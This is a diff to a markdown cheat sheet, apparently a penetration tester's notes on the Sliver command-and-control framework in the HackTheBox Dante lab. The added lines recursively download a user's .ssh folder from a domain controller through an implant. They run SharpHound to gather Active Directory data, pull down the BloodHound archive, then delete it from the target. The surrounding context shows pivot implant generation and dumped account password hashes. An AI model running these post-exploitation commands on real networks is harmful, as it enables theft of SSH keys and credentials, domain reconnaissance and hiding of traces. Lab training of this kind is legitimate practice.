@@ -210,6 +210,18 @@ generate --tcp-pivot 172.16.1.100:3006 -a amd64 -o linux -s /home/ubuntu/Documen
 generate --tcp-pivot 172.16.1.100:3006 -a amd64 -o windows -s /home/ubuntu/Documents/htb/dante/172.16.1.100.3006.pivot
 ```
 
+### Download&#x20;
+
+* Recursive Download&#x20;
+* **DANGER** -> If you do not set -t \<timeout in seconds> and the default timeout for command occurs then your session will die.
+* If you are downloading a large amount of files ensure you set a long timout to avoid a session being killed
+
+```
+download -r 'C:\Users\katwamba\.ssh'
+
+[*] Wrote 2651 bytes (3 files successfully, 0 files unsuccessfully) to /home/ubuntu/Documents/htb/dante/10.10.110.100/implants/dante-dc01_download_C_Users_katwamba_ssh_1714697939.tar.gz
+```
+
 ### Port Forward Quick Paste
 
 ```
@@ -351,4 +363,19 @@ MediaAdmin$  DANTE   7c53bb427b222695060d8fd771743fb9  10757578eb3902bd612c306be
 katwamba     DANTE   14a71f9de5448d83e8c63d46355837c3  61d3cacf6ad5f4571747b302a9658f7e85c5d516
 xadmin       DANTE   649f65054a6672a9898cb4eb61f9684a  b57e3049b5960ed60f1baa679ab0cfd4f68b0b06
 --snip--
+```
+
+### Sharphound Sliver
+
+```
+sharp-hound-3 -i -s -t 120
+sharp-hound-4 -i -s -t 120
+[*] sharp-hound-4 output:
+
+[*] Output saved to /tmp/sharp-hound-4_DANTE-DC01884950909.log
+
+download 20240503015529_BloodHound.zip
+
+[*] Wrote 10141 bytes (1 file successfully, 0 files unsuccessfully) to /home/ubuntu/Documents/htb/dante/10.10.110.100/implants/20240503015529_BloodHound.zip
+rm 20240503015529_BloodHound.zip
 ```
